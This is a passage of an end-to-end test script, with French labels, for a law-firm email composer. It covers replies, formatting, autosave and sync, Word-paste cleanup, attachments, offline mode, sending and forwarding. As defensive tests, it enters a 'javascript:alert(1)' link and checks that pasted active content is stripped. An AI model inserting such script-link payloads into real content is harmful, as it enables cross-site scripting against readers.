    await cliquer("[data-testid=redac-histo]");
    const q1 = await citation();
    verifier("historique affiché sur demande", q1?.affiche === true);
    verifier("la citation porte la mention d'origine et le texte", /a écrit\s?:/u.test(q1.texte) && q1.texte.includes(`creneau ${marque}`) && q1.texte.includes(expediteur), q1.texte);
    essaiNegatif("l'historique reste masqué après « Afficher »", q1.affiche === false);
    await cliquer("[data-testid=redac-histo]");
    verifier("historique masqué de nouveau", (await citation())?.affiche === false);
    const id = await idBrouillon();
    verifier("identifiant du brouillon", /^[0-9a-f-]{36}$/u.test(String(id)));
    await sleep(2500);
    verifier("réponse intacte : rien d'enregistré sur le poste", Number((await sqliteLocal(`SELECT COUNT(*) AS n FROM brouillons_message WHERE id = '${id}'`))?.[0]?.n) === 0);
    verifier("réponse intacte : rien au serveur", (await sqlServeur(`SELECT COUNT(*) FROM brouillons_message WHERE id = '${id}'`)) === "0");
    const statutDepart = norm(await texteDe("[data-testid=redac-statut]"));
    verifier("statut avant écriture", statutDepart.includes("s'enregistre dès que vous écrivez"), statutDepart);
    ok("réponse à tous : destinataires, objet, historique cité masqué/affiché, réponse intacte non enregistrée");

    // ===== 2 et 3. Écriture, mise en forme, enregistrement automatique =====
    await focusCorps();
    await taper(`Bien reçu ${marque}, merci. `);
    await cliquer("[data-testid=outil-gras]");
    await taper("important");
    await cliquer("[data-testid=outil-gras]");
    await taper(" et ");
    await cliquer("[data-testid=outil-italique]");
    await taper("nuance");
    await cliquer("[data-testid=outil-italique]");
    await entree();
    await cliquer("[data-testid=outil-puces]");
    await taper("premier point");
    await entree();
    await taper("second point");
    await entree();
    await entree(); // sortie de la liste
    await taper("Lien : https://www.legifrance.gouv.fr/ ");
    const html = await htmlCorps();
    verifier("gras", html.includes("<strong>important</strong>"), html);
    verifier("italique", html.includes("<em>nuance</em>"), html);
    verifier("liste à puces", /<ul><li><p>premier point<\/p><\/li><li><p>second point<\/p><\/li><\/ul>/u.test(html), html);
    verifier("lien reconnu à la frappe", /<a [^>]*href="https:\/\/www\.legifrance\.gouv\.fr\/?"/u.test(html), html);
    essaiNegatif("un texte non formaté passe pour gras", /<strong>[^<]*merci[^<]*<\/strong>/u.test(html));

    // Lien par le bouton : adresse admise, puis adresse dangereuse refusée.
    await js(`(() => { const p = [...document.querySelectorAll("[data-testid=redac-corps] p")].find((n) => n.textContent.startsWith("Bien reçu")); const r = document.createRange(); r.selectNodeContents(p.firstChild); const s = getSelection(); s.removeAllRanges(); s.addRange(r); })()`);
    await sleep(200);
    await cliquer("[data-testid=outil-lien]");
    await attendre("champ du lien", () => present("[data-testid=redac-lien-adresse]"), Boolean);
    await saisir("[data-testid=redac-lien-adresse]", "javascript:alert(1)");
    await cliquer("[data-testid=redac-lien-valider]");
    const refusLien = await attendre("refus du lien dangereux", () => texteDe("[data-testid=redac-lien-refuse]"), (t) => t !== "", 10_000);
    verifier("lien dangereux refusé avec une phrase", norm(refusLien).includes("http, https, mailto et tel"), refusLien);
    essaiNegatif("un lien javascript est entré dans le message", /javascript:/iu.test(await htmlCorps()));
    await saisir("[data-testid=redac-lien-adresse]", "www.example.com/contact");
    await cliquer("[data-testid=redac-lien-valider]");
    verifier("lien par le bouton, https ajouté", (await htmlCorps()).includes('href="https://www.example.com/contact"'));

    // Enregistrement local, puis serveur, puis copie IMAP.
    const ligneLocale = await attendre(
      "brouillon écrit sur le poste",
      () => sqliteLocal(`SELECT genre, origine_message_id, en_reponse_a, references_texte, corps_html, objet FROM brouillons_message WHERE id = '${id}'`),
      (r) => Array.isArray(r) && r.length === 1 && String(r[0].corps_html).includes("important"),
      20_000,
    );
    const l = ligneLocale[0];
    verifier("genre, message d'origine et fil écrits localement", l.genre === "reponse_a_tous" && l.origine_message_id === idMessage && l.en_reponse_a === idMessageRecu && String(l.references_texte).includes(idMessageRecu), JSON.stringify(l));
    verifier("l'historique cité est dans le brouillon", String(l.corps_html).includes("<blockquote>") && String(l.corps_html).includes(`creneau ${marque}`));
    verifier("la signature est dans le brouillon, avant l'historique", ordre(String(l.corps_html), "important", sigCabinet, "<blockquote>"), String(l.corps_html).slice(0, 400));
    await attendre("statut « enregistré sur cet appareil » ou serveur", () => texteDe("[data-testid=redac-statut]"), (t) => /Brouillon enregistré à \d{1,2} h \d{2}/u.test(norm(t)), 15_000);
    const ligneServeur = await attendre(
      "brouillon reçu par le serveur (connecteur du poste)",
      () => sqlServeur(`SELECT objet || '|' || genre || '|' || en_reponse_a FROM brouillons_message WHERE id = '${id}'`),
      (v) => v.includes("Re : "),
      30_000,
    );
    verifier("le serveur a l'objet, le genre et le fil", ligneServeur === `Re : ${objetRecu}|reponse_a_tous|${idMessageRecu}`, ligneServeur);
    const corpsServeur = await sqlServeur(`SELECT corps_html FROM brouillons_message WHERE id = '${id}'`);
    verifier("le serveur a la mise en forme", corpsServeur.includes("<strong>important</strong>") && corpsServeur.includes("<em>nuance</em>") && corpsServeur.includes("<ul>"), corpsServeur.slice(0, 300));
    verifier("le serveur a aussi l'historique cité", corpsServeur.includes("<blockquote>"));
    const messageIdBrouillon = await sqlServeur(`SELECT message_id FROM brouillons_message WHERE id = '${id}'`);
    const copies = await attendre("copie dans le dossier Brouillons du serveur IMAP", async () => copiesBrouillon(messageIdBrouillon), (c) => c.length === 1, 30_000);
    verifier("la copie IMAP porte \\Draft", copies[0].drapeaux.includes("\\Draft"), JSON.stringify(copies[0].drapeaux));
    verifier("la copie IMAP porte l'objet et In-Reply-To", valeurEnTete(copies[0].brut, "Subject").includes(objetRecu) && valeurEnTete(copies[0].brut, "In-Reply-To") === idMessageRecu);
    await attendre("statut « visible sur vos autres appareils »", () => texteDe("[data-testid=redac-statut]"), (t) => /visible sur vos autres appareils/u.test(norm(t)), 20_000);
    essaiNegatif("le statut dit « visible » alors que la file n'est pas vide", (await sqliteLocal(`SELECT COUNT(*) AS n FROM ps_crud`))?.[0]?.n > 0 && /visible sur vos autres appareils/u.test(norm(await texteDe("[data-testid=redac-statut]"))));
    ok("mise en forme, enregistrement local puis serveur (connecteur), copie IMAP \\Draft avec le fil");

    // ===== 4. Texte collé depuis Word =====
    essaiNegatif("le texte Word de départ passe pour propre", !DEFAUTS.test(COLLAGE_WORD));
    await focusCorps();
    await js(`(() => {
      const el = document.querySelector("[data-testid=redac-corps]");
      const sel = getSelection(); const r = document.createRange();
      r.selectNodeContents(el.querySelector("blockquote") ? el.querySelector("blockquote").previousElementSibling : el.lastElementChild); r.collapse(false);
      sel.removeAllRanges(); sel.addRange(r);
    })()`);
    await sleep(400);
    await js(`(() => {
      const el = document.querySelector("[data-testid=redac-corps]");
      const dt = new DataTransfer();
      dt.setData("text/html", ${JSON.stringify(COLLAGE_WORD)});
      dt.setData("text/plain", "Collage Word");
      el.dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
    })()`);
    await attendre("texte collé", () => htmlCorps(), (h) => h.includes(`Collage Word ${marque}`), 10_000);
    const apresCollage = await htmlCorps();
    verifier("texte collé : le texte et le gras sont gardés", apresCollage.includes(`Collage Word ${marque}`) && /<strong>[^<]*Collage Word/u.test(apresCollage), apresCollage.slice(-400));
    verifier("texte collé : lien légitime gardé", apresCollage.includes('href="https://www.legifrance.gouv.fr/x"'));
    verifier("texte collé : aucun script, style, image ni contenu distant", !DEFAUTS.test(apresCollage), apresCollage);
    verifier("texte collé : le lien dangereux a perdu son adresse", apresCollage.includes("piège") && !/javascript/iu.test(apresCollage));
    await attendre(
      "collage enregistré sur le serveur sans contenu actif",
      () => sqlServeur(`SELECT corps_html FROM brouillons_message WHERE id = '${id}'`),
      (v) => v.includes(`Collage Word ${marque}`),
      20_000,
    );
    verifier("le serveur ne reçoit aucun contenu actif", !DEFAUTS.test(await sqlServeur(`SELECT corps_html FROM brouillons_message WHERE id = '${id}'`)));
    ok("texte collé depuis Word nettoyé : ni script, ni style, ni image, ni contenu distant, ni lien javascript");

    // ===== 5. À, cc, cci avec complétion =====
    await cliquer("[data-testid=redac-ouvrir-cci]");
    await attendre("champ Cci", () => present("[data-testid=saisie-cci]"), Boolean);
    await js(`document.querySelector("[data-testid=saisie-cci]").focus()`);
    await saisir("[data-testid=saisie-cci]", `annuaire.${marque}`);
    const sugg = await attendre("suggestions du Cci", () => js(`[...document.querySelectorAll("[data-testid=suggestion-cci]")].map((s) => ({ adresse: s.getAttribute("data-adresse"), texte: s.innerText }))`), (s) => s.length > 0, 15_000);
    verifier("complétion par l'annuaire du cabinet", sugg.some((s) => s.adresse === emailContact && s.texte.includes(`Nom Annuaire ${marque}`) && /Contact/u.test(s.texte)), JSON.stringify(sugg));
    await touche("ArrowDown", "ArrowDown", 40);
    await entree();
    await attendre("puce Cci", () => adressesChamp("cci"), (a) => a.includes(emailContact));
    verifier("le champ de saisie est vidé", (await js(`document.querySelector("[data-testid=saisie-cci]").value`)) === "");
    // Mails déjà échangés : l'expéditeur du message reçu.
    await js(`document.querySelector("[data-testid=saisie-cc]").focus()`);
    await saisir("[data-testid=saisie-cc]", `tiers.${marque}`);
    const sugg2 = await attendre("suggestions par les mails échangés", () => js(`[...document.querySelectorAll("[data-testid=suggestion-cc]")].map((s) => ({ adresse: s.getAttribute("data-adresse"), texte: s.innerText }))`), (s) => s.length > 0, 15_000);
    verifier("complétion par les mails déjà échangés", sugg2.some((s) => s.adresse === expediteur), JSON.stringify(sugg2));
    await saisir("[data-testid=saisie-cc]", "");
    verifier("saisie du Cc vidée", (await js(`document.querySelector("[data-testid=saisie-cc]").value`)) === "");
    // Essais négatifs : aucune suggestion pour un mot inconnu ; une saisie qui n'est pas une adresse est refusée.
    await js(`document.querySelector("[data-testid=saisie-cci]").focus()`);
    await saisir("[data-testid=saisie-cci]", `zzzinconnu${marque}`);
    await sleep(1200);
    essaiNegatif("une suggestion pour un mot inconnu", (await compter("[data-testid=suggestion-cci]")) > 0);
    await saisir("[data-testid=saisie-cci]", "pas-une-adresse");
    await touche("Enter", "Enter", 13, "\r");
    await attendre("refus de la saisie", () => texteDe("[data-testid=refus-cci]"), (t) => t.includes("n'est pas une adresse valable") || t.includes("n’est pas une adresse valable"));
    verifier("aucune puce pour une saisie invalide", !(await adressesChamp("cci")).some((a) => a.includes("pas-une-adresse")));
    await saisir("[data-testid=saisie-cci]", "");
    // Ajout manuel de la boîte du cabinet en Cci (pour lire l'envoi), puis liste collée.
    await saisir("[data-testid=saisie-cci]", `${boite}, collee.${marque}@example.com;`);
    await attendre("liste collée en puces", () => adressesChamp("cci"), (a) => a.includes(boite) && a.includes(`collee.${marque}@example.com`));
    await attendre(
      "à, cc, cci enregistrés sur le serveur",
      () => sqlServeur(`SELECT cci FROM brouillons_message WHERE id = '${id}'`),
      (v) => v.includes(emailContact) && v.includes(boite),
      20_000,
    );
    ok("à, cc, cci : complétion (annuaire, mails échangés), saisie invalide refusée, liste collée, enregistrement serveur");

    // ===== 6. Pièces par glisser-déposer =====
    const annonce = await texteDe("[data-testid=redac-annonce-taille]");
    verifier("taille maximale annoncée", /25\s?Mio au plus par message/u.test(norm(annonce)), annonce);
    verifier("la valeur annoncée est celle de l'API", (await js(`document.querySelector("[data-testid=redac-annonce-taille]").getAttribute("data-max")`)) === String(25 * MO));
    const piecesServeur = () => sqlServeur(`SELECT COUNT(*) FROM brouillons_message_pieces WHERE brouillon_id = '${id}'`);
    await deposer([{ nom: `note-${marque}.txt`, texte: `Pièce fictive ${marque}`, type: "text/plain" }]);
    await attendre("pièce affichée", () => js(`[...document.querySelectorAll("[data-testid=redac-piece]")].map((p) => ({ nom: p.getAttribute("data-nom"), etat: p.getAttribute("data-etat") }))`), (p) => p.some((x) => x.nom === `note-${marque}.txt` && x.etat === "jointe"), 30_000);
    verifier("pièce au serveur", (await piecesServeur()) === "1");
    // Taille unitaire : 26 Mio refusés avant tout envoi d'octets.
    await deposer([{ nom: `gros-${marque}.bin`, taille: 26 * MO }]);
    const refus1 = await attendre("refus d'un fichier de 26 Mio", () => texteDe("[data-testid=redac-piece-refus]"), (t) => t !== "", 15_000);
    verifier("refus avec la limite nommée", /dépasse la taille maximale/u.test(norm(refus1)) && /25 Mio/u.test(norm(refus1)), refus1);
    verifier("rien de plus au serveur", (await piecesServeur()) === "1");
    essaiNegatif("le fichier de 26 Mio est parti", (await piecesServeur()) !== "1");
    await cliquer("[data-testid=redac-piece][data-etat=refusee] [data-testid=redac-piece-retirer]");
    // Taille cumulée : 20 Mio acceptés, 6 Mio refusés.
    await deposer([{ nom: `vingt-${marque}.bin`, taille: 20 * MO }]);
    await attendre("20 Mio acceptés", () => piecesServeur(), (n) => n === "2", 90_000);
    await attendre("pièce de 20 Mio jointe à l'écran", () => js(`[...document.querySelectorAll("[data-testid=redac-piece]")].filter((p) => p.getAttribute("data-etat") === "jointe").length`), (n) => n === 2, 30_000);
    await deposer([{ nom: `six-${marque}.bin`, taille: 6 * MO }]);
    const refus2 = await attendre("refus du cumul", () => texteDe("[data-testid=redac-piece-refus]"), (t) => t !== "", 15_000);
    verifier("cumul refusé", /dépasse la taille maximale/u.test(norm(refus2)));
    verifier("le serveur garde deux pièces", (await piecesServeur()) === "2");
    await cliquer("[data-testid=redac-piece][data-etat=refusee] [data-testid=redac-piece-retirer]");
    // Retrait d'une pièce.
    await js(`[...document.querySelectorAll("[data-testid=redac-piece]")].find((p) => p.getAttribute("data-nom") === "vingt-${marque}.bin").querySelector("[data-testid=redac-piece-retirer]").click()`);
    await attendre("pièce retirée du serveur", () => piecesServeur(), (n) => n === "1", 30_000);
    verifier("le résumé des pièces suit sur le poste", Boolean(await attendre("résumé local des pièces", () => sqliteLocal(`SELECT pieces_texte FROM brouillons_message WHERE id = '${id}'`), (r) => String(r?.[0]?.pieces_texte).includes(`note-${marque}.txt`) && !String(r?.[0]?.pieces_texte).includes("vingt-"), 20_000)));
    ok("pièces : glisser-déposer, 25 Mio annoncés, refus unitaire et cumulé avant envoi, retrait");

    // ===== 7. Hors ligne =====
    await js(`window.__legalosRecette.disconnectSync()`);
    await sleep(500);
    const objetHorsLigne = `Re : ${objetRecu} (hors ligne ${marque})`;
    await saisir("[data-testid=redac-objet]", objetHorsLigne);
    await attendre("objet écrit sur le poste hors ligne", () => sqliteLocal(`SELECT objet FROM brouillons_message WHERE id = '${id}'`), (r) => r?.[0]?.objet === objetHorsLigne, 15_000);
    await attendre("statut « disponible hors ligne »", () => texteDe("[data-testid=redac-statut]"), (t) => /disponible hors ligne/u.test(norm(t)), 15_000);
    verifier("écriture en file locale", Number((await sqliteLocal(`SELECT COUNT(*) AS n FROM ps_crud`))?.[0]?.n) >= 1);
    await sleep(3000);
    verifier("le serveur n'a pas encore l'objet", (await sqlServeur(`SELECT objet FROM brouillons_message WHERE id = '${id}'`)) !== objetHorsLigne);
    essaiNegatif("le serveur a reçu l'écriture hors ligne", (await sqlServeur(`SELECT objet FROM brouillons_message WHERE id = '${id}'`)) === objetHorsLigne);
    await js(`window.__legalosRecette.reconnectSync()`);
    await attendre("objet reçu par le serveur à la reconnexion", () => sqlServeur(`SELECT objet FROM brouillons_message WHERE id = '${id}'`), (v) => v === objetHorsLigne, 60_000);
    await attendre("file locale vidée", () => sqliteLocal(`SELECT COUNT(*) AS n FROM ps_crud`), (r) => Number(r?.[0]?.n) === 0, 30_000);
    verifier("aucun refus consigné pour ce brouillon", Number((await sqliteLocal(`SELECT COUNT(*) AS n FROM refus_sync WHERE enregistrement_id = '${id}'`))?.[0]?.n) === 0);
    ok("hors ligne : écrit sur le poste, reçu par le serveur à la reconnexion, aucun refus");
    await saisir("[data-testid=redac-objet]", `Re : ${objetRecu}`);
    await attendre("objet rétabli côté serveur", () => sqlServeur(`SELECT objet FROM brouillons_message WHERE id = '${id}'`), (v) => v === `Re : ${objetRecu}`, 30_000);

    // Capture du poste réel : la rédaction (réponse), jour et nuit.
    await sleep(500);
    await capturer("redaction-poste-reel-jour-reponse.png", "light");
    await capturer("redaction-poste-reel-nuit-reponse.png", "dark");
    await js(`document.documentElement.dataset.theme = "light"`);

    // ===== 8. Envoi =====
    const fileLigne = `[data-testid=file-envoi-ligne][data-id="${id}"]`;
    // Sans destinataire : refus. (nouveau mail à part)
    await cliquer("[data-testid=redac-envoyer]");
    await attendre("envoi de la réponse", () => present(FORM), (v) => v === false, 60_000);
    await attendre("ligne de la file d'envoi", () => present(fileLigne), Boolean, 30_000);
    await attendre("copie dans Envoyés confirmée", () => js(`document.querySelector(${JSON.stringify(fileLigne)})?.getAttribute("data-etat") ?? null`), (e) => e === "copie_envoyes_confirmee", 120_000);
    verifier("libellé de la file", /Copie dans « Envoyés » confirmée/u.test(norm(await texteDe(fileLigne))));
    const recu = await attendre("message reçu", async () => imap({ action: "chercher", dossier: "INBOX", cible: messageIdBrouillon }), (c) => c.length === 1, 60_000);
    const brut = recu[0].brut;
    verifier("In-Reply-To posé", valeurEnTete(brut, "In-Reply-To") === idMessageRecu, valeurEnTete(brut, "In-Reply-To"));
    verifier("References posé", valeurEnTete(brut, "References").includes(idMessageRecu));
    verifier("objet", valeurEnTete(brut, "Subject") === `Re : ${objetRecu}`, valeurEnTete(brut, "Subject"));
    verifier("destinataires en À et Cc", valeurEnTete(brut, "To").includes(expediteur) && valeurEnTete(brut, "Cc").includes(copieTiers));
    essaiNegatif("la copie cachée apparaît dans les en-têtes reçus", /^Bcc:/im.test(enTetes(brut)));
    const corpsRecu = corpsDe(recu[0]);
    verifier("l'historique cité est dans le message", corpsRecu.includes(`creneau ${marque}`) && /<blockquote/iu.test(corpsRecu) && /a écrit/u.test(corpsRecu), `${corpsRecu.slice(0, 300)} / ${JSON.stringify(recu[0].parties).slice(0, 300)}`);
    verifier("mise en forme dans le message", corpsRecu.includes("<strong>important</strong>") && corpsRecu.includes("<em>nuance</em>") && /<ul>/u.test(corpsRecu));
    verifier("la signature du compte est dans le message reçu, sous le texte et avant l'historique", ordre(corpsRecu, "important", sigCabinet, "<blockquote"), corpsRecu.slice(0, 500));
    const htmlRecu = recu[0].parties.find((p) => p.type === "text/html")?.texte ?? "";
    verifier("la signature n'est pas doublée à l'envoi (une fois dans la partie HTML)", occurrences(htmlRecu, sigCabinet) === 1 && occurrences(htmlRecu, "<p>--</p>") + occurrences(htmlRecu, "-- <br>") <= 1, htmlRecu.slice(0, 500));
    essaiNegatif("la signature d'un autre compte est dans le message reçu", corpsRecu.includes(sigPerso));
    verifier("pièce jointe dans le message", piecesDe(recu[0]).includes(`note-${marque}.txt`), JSON.stringify(piecesDe(recu[0])));
    essaiNegatif("un contenu actif dans le message reçu", DEFAUTS.test(corpsRecu));
    await attendre("brouillon retiré du serveur", () => sqlServeur(`SELECT COUNT(*) FROM brouillons_message WHERE id = '${id}'`), (v) => v === "0", 30_000);
    await attendre("brouillon retiré du poste", () => sqliteLocal(`SELECT COUNT(*) AS n FROM brouillons_message WHERE id = '${id}'`), (r) => Number(r?.[0]?.n) === 0, 30_000);
    await attendre("copie IMAP du brouillon retirée", async () => copiesBrouillon(messageIdBrouillon), (c) => c.length === 0, 30_000);
    ok("envoi : file jusqu'à « copie dans Envoyés confirmée », message reçu avec fil et citation, sans Bcc, brouillon et copie IMAP retirés");

    // Envoi sans destinataire : refusé, rien ne part.
    const fileAvant = await sqlServeur(`SELECT COUNT(*) FROM file_envoi WHERE cabinet_id = '${cabinet}'`);
    await evaluate(send, `[...document.querySelectorAll("[data-testid=barre-actions] button")].find((b) => b.innerText.includes("Nouveau mail"))?.click()`);
    await attendre("nouveau mail", () => present(FORM), Boolean, 15_000);
    verifier("titre « Nouveau mail »", (await texteDe("[data-testid=redac-titre]")) === "Nouveau mail");
    verifier("aucun historique pour un message neuf", (await present("[data-testid=redac-histo]")) === false);
    // (i) identité d'envoi : le compte d'un message neuf se choisit avant la première saisie.
    // Le formulaire s'affiche avant que le compte de départ soit posé : on attend qu'il le soit (sinon, la lecture est une course).
    const choixDe = await attendre(
      "un compte de départ est choisi pour le message neuf",
      () => js(`(() => { const s = document.querySelector("select[data-testid=redac-de-choix]"); return s ? { valeur: s.value, options: [...s.options].map((o) => ({ v: o.value, t: o.text })) } : null; })()`),
      (c) => c !== null && c.valeur !== "",
      15_000,
    );
    verifier("(i) message neuf depuis la barre d'actions : sélecteur « De », la boîte du cabinet proposée en premier, puis mes boîtes", choixDe !== null && norm(choixDe.options[0]?.t).includes("Boîte d'envoi du cabinet") && choixDe.options.some((o) => o.v === comptePerso && o.t === adressePerso), JSON.stringify(choixDe?.options.slice(0, 3)));
    // Les comptes de l'utilisateur de démo laissés par d'autres recettes sont les siens et restent proposés ; jamais ceux d'un confrère ni la boîte de classement.
    const interdits = new Set((await sqlServeur(`SELECT COALESCE(string_agg(id::text, ','), '') FROM comptes_mail WHERE type_compte = 'classement' OR (type_compte = 'nominatif' AND titulaire_id <> '${demoId}')`)).split(",").filter(Boolean));
    verifier("(i) la liste des comptes d'un confrère n'est pas vide en base (l'essai négatif ci-dessous a un sens)", interdits.size > 0);
    essaiNegatif("(i) le sélecteur propose la boîte de classement ou le compte d'un confrère", (choixDe?.options ?? []).some((o) => interdits.has(o.v)));
    const choisirDe = (valeur) => js(`(() => { const s = document.querySelector("select[data-testid=redac-de-choix]"); Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, "value").set.call(s, ${JSON.stringify(valeur)}); s.dispatchEvent(new Event("change", { bubbles: true })); })()`);
    const premierNominatif = choixDe?.options.find((o) => o.v !== "")?.v;
    const nominatifsDeMoi = new Set((await sqlServeur(`SELECT COALESCE(string_agg(id::text, ','), '') FROM comptes_mail WHERE type_compte = 'nominatif' AND titulaire_id = '${demoId}'`)).split(",").filter(Boolean));
    verifier("(i) le départ par défaut est mon premier compte nominatif proposé, pas la boîte du cabinet", choixDe !== null && choixDe.valeur !== "" && choixDe.valeur === premierNominatif && nominatifsDeMoi.has(choixDe.valeur), JSON.stringify({ valeur: choixDe?.valeur, premier: premierNominatif }));
    essaiNegatif("(i) le départ par défaut est la boîte du cabinet", choixDe?.valeur === "");
    await choisirDe(comptePerso);
    const corpsNeuf = await attendre("signature de ma boîte insérée dans le message neuf (compte choisi)", () => htmlCorps(), (h) => h.includes(sigPerso) && !h.includes(sigCabinet), 15_000);
    verifier("message neuf : un paragraphe pour écrire, puis la signature de ma boîte", ordre(corpsNeuf, "<br", "<p>--</p>", sigPerso) && corpsNeuf.startsWith("<p><br") && occurrences(corpsNeuf, sigPerso) === 1, corpsNeuf);
    essaiNegatif("la signature de la boîte du cabinet est dans le message neuf", corpsNeuf.includes(sigCabinet));
    await choisirDe("");
    const corpsDuCabinet = await attendre("signature de la boîte du cabinet à la place de la mienne", () => htmlCorps(), (h) => h.includes(sigCabinet) && !h.includes(sigPerso), 15_000);
    verifier("(i) choisir la boîte du cabinet remplace la signature, une seule fois", occurrences(corpsDuCabinet, sigCabinet) === 1 && occurrences(corpsDuCabinet, "<p>--</p>") === 1, corpsDuCabinet);
    await choisirDe(comptePerso);
    const corpsDePerso = await attendre("signature de ma boîte à la place de celle du cabinet", () => htmlCorps(), (h) => h.includes(sigPerso) && !h.includes(sigCabinet), 15_000);
    verifier("(i) revenir à ma boîte remplace la signature, une seule fois", occurrences(corpsDePerso, sigPerso) === 1 && occurrences(corpsDePerso, "<p>--</p>") === 1, corpsDePerso);
    verifier("(i) rien n'est enregistré par le seul choix du compte", (await sqlServeur(`SELECT COUNT(*) FROM brouillons_message WHERE cabinet_id = '${cabinet}' AND objet = 'Sans destinataire ${marque}'`)) === "0");
    await saisir("[data-testid=redac-objet]", `Sans destinataire ${marque}`);
    const idNeuf = await idBrouillon();
    const compteAuServeur = await attendre("brouillon au serveur avec le compte choisi", () => sqlServeur(`SELECT COALESCE(compte_id::text, '') FROM brouillons_message WHERE id = '${idNeuf}'`), (v) => v !== "", 40_000);
    verifier("(i) le brouillon part du compte choisi", compteAuServeur === comptePerso, compteAuServeur);
    essaiNegatif("(i) le brouillon part du compte du cabinet", compteAuServeur === compteCabinet);
    await attendre("compte figé dès l'enregistrement", async () => !(await present("select[data-testid=redac-de-choix]")), Boolean, 15_000);
    verifier("(i) le compte enregistré s'affiche sans sélecteur", norm(await texteDe("[data-testid=redac-de]")).includes(adressePerso), norm(await texteDe("[data-testid=redac-de]")));
    essaiNegatif("(i) le sélecteur reste proposé après l'enregistrement", await present("select[data-testid=redac-de-choix]"));
    await saisir("[data-testid=redac-objet]", `Sans destinataire ${marque}`);
    await cliquer("[data-testid=redac-envoyer]");
    await attendre("refus d'envoi", () => texteDe("[data-testid=redac-erreur]"), (t) => t.includes("Ajoutez au moins un destinataire"), 15_000);
    await sleep(1500);
    verifier("rien dans la file d'envoi", (await sqlServeur(`SELECT COUNT(*) FROM file_envoi WHERE cabinet_id = '${cabinet}'`)) === fileAvant);
    essaiNegatif("un message sans destinataire est parti", (await sqlServeur(`SELECT COUNT(*) FROM file_envoi WHERE cabinet_id = '${cabinet}'`)) !== fileAvant);
    ok("envoi sans destinataire refusé, rien dans la file");

    // ===== 9. Transfert avec pièce conservée =====
    await cliquer("[data-testid=vue-a-classer]");
    await attendre("message dans la liste (transfert)", () => present(ligne), Boolean);
    await cliquer(ligne);
    await attendre("lecture", () => texteDe("[data-testid=lecture-objet]"), (t) => t.includes(objetRecu));
    await cliquer("[data-testid=lecture-transferer]");
    await attendre("rédaction du transfert", () => present(FORM), Boolean);
    verifier("titre « Transférer »", (await texteDe("[data-testid=redac-titre]")) === "Transférer");
    verifier("objet « Tr : »", (await js(`document.querySelector("[data-testid=redac-objet]").value`)) === `Tr : ${objetRecu}`);
    verifier("aucun destinataire au départ", (await compter("[data-testid=puce-a]")) === 0);
    const q2 = await citation();
    verifier("historique du transfert affiché, avec l'en-tête du message", q2?.affiche === true && q2.texte.includes("Message transféré") && q2.texte.includes(`Objet : ${objetRecu}`) && q2.texte.includes(`creneau ${marque}`), q2?.texte);
    const corpsTransfert = await attendre("signature insérée dans le transfert", () => htmlCorps(), (h) => h.includes(sigCabinet), 15_000);
    verifier("transfert : la signature est avant le message transféré", ordre(corpsTransfert, "<p>--</p>", sigCabinet, "Message transféré") && occurrences(corpsTransfert, sigCabinet) === 1, corpsTransfert.slice(0, 400));
    const idT = await idBrouillon();
    await attendre("pièce conservée affichée", () => js(`[...document.querySelectorAll("[data-testid=redac-piece]")].map((p) => ({ nom: p.getAttribute("data-nom"), etat: p.getAttribute("data-etat") }))`), (p) => p.some((x) => x.nom === "Convocation.pdf"), 10_000);
    await js(`document.querySelector("[data-testid=saisie-a]").focus()`);
    await saisir("[data-testid=saisie-a]", `${boite};`);
    await attendre("destinataire du transfert", () => adressesChamp("a"), (a) => a.includes(boite));
    await focusCorps();
    await taper(`Pour information ${marque}. `);
    await attendre("pièce d'origine au serveur", () => sqlServeur(`SELECT COUNT(*) FROM brouillons_message_pieces WHERE brouillon_id = '${idT}'`), (n) => n === "1", 40_000);
    await attendre("pièce jointe confirmée à l'écran", () => js(`[...document.querySelectorAll("[data-testid=redac-piece]")].map((p) => p.getAttribute("data-etat"))`), (e) => e.length === 1 && e[0] === "jointe", 30_000);
    const messageIdT = await sqlServeur(`SELECT message_id FROM brouillons_message WHERE id = '${idT}'`);
    verifier("un transfert n'ouvre aucun fil", (await sqlServeur(`SELECT COALESCE(en_reponse_a, '') FROM brouillons_message WHERE id = '${idT}'`)) === "");
    await cliquer("[data-testid=redac-envoyer]");
    await attendre("transfert envoyé", () => present(FORM), (v) => v === false, 60_000);
    const recuT = await attendre("transfert reçu", async () => imap({ action: "chercher", dossier: "INBOX", cible: messageIdT }), (c) => c.length === 1, 120_000);
    const brutT = recuT[0].brut;
    verifier("transfert : objet", valeurEnTete(brutT, "Subject") === `Tr : ${objetRecu}`, valeurEnTete(brutT, "Subject"));
    verifier("transfert : pièce du message d'origine conservée", piecesDe(recuT[0]).includes("Convocation.pdf"), JSON.stringify(piecesDe(recuT[0])));
    verifier("transfert : historique cité", corpsDe(recuT[0]).includes("Message transféré") && corpsDe(recuT[0]).includes(`creneau ${marque}`));
    essaiNegatif("un transfert pose In-Reply-To", valeurEnTete(brutT, "In-Reply-To") !== "");
    ok("transfert : historique cité avec en-tête, pièce d'origine conservée et reçue, aucun fil");

    // ===== 10. Reprise, second poste, suppression =====
    await evaluate(send, `[...document.querySelectorAll("[data-testid=barre-actions] button")].find((b) => b.innerText.includes("Nouveau mail"))?.click()`);
    await attendre("nouveau mail (reprise)", () => present(FORM), Boolean, 15_000);
    const idR = await idBrouillon();
    // Le départ par défaut est une boîte nominative quelconque (les recettes en laissent beaucoup) : ce scénario part de la
    // boîte du cabinet, dont la signature est connue, comme avant la consigne du 20/10.
    await choisirDe("");
    await attendre("signature du message à reprendre", () => htmlCorps(), (h) => h.includes(sigCabinet), 15_000);
    const objetReprise = `Reprise ${marque}`;
    await saisir("[data-testid=redac-objet]", objetReprise);
    await js(`document.querySelector("[data-testid=saisie-a]").focus()`);
    await saisir("[data-testid=saisie-a]", `reprise.${marque}@example.com;`);
    await focusCorps();
    await taper(`Texte à reprendre ${marque}`);
    await attendre("brouillon de reprise au serveur", () => sqlServeur(`SELECT objet FROM brouillons_message WHERE id = '${idR}'`), (v) => v === objetReprise, 40_000);
    const messageIdR = await sqlServeur(`SELECT message_id FROM brouillons_message WHERE id = '${idR}'`);
    // Fermeture de la rédaction (autre vue), puis dossier Brouillons.
    await cliquer("[data-testid=dossier-imap][data-boite=perso][data-dossier=reception]");
    await attendre("rédaction fermée", () => present(FORM), (v) => v === false, 10_000);
    await cliquer("[data-testid=dossier-imap][data-boite=perso][data-dossier=brouillons]");
    await attendre("liste des Brouillons", () => texteDe("[data-testid=liste-titre]"), (t) => t === "Brouillons");
    const ligneBrouillon = `[data-testid=mail-ligne][data-id="${idR}"]`;
